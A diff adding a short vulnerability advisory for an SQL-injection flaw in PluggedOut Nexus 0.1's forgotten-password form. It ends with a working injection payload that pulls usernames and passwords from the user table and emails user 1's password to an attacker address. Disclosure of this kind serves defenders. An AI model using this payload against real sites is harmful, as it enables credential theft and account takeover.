@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/16915/info
+
+PluggedOut Nexus is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query. 
+
+Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
+
+Nexus 0.1 is reportedly affected by this issue.
+
+The following proof of concept exploit is available:
+Insert this code in E-Mail Address form (http://www.example.com/Nexus/forgotten_password.php) :
+hamidnetworksecurityteam' union select
+cUsername,cPassword,'ATTACKER@EMAIL.ADDRESS' from
+nexus_users WHERE nUserId=1 and '1'='1
+
+This will email the password for userID=1 to ATTACKER@EMAIL.ADDRESS.
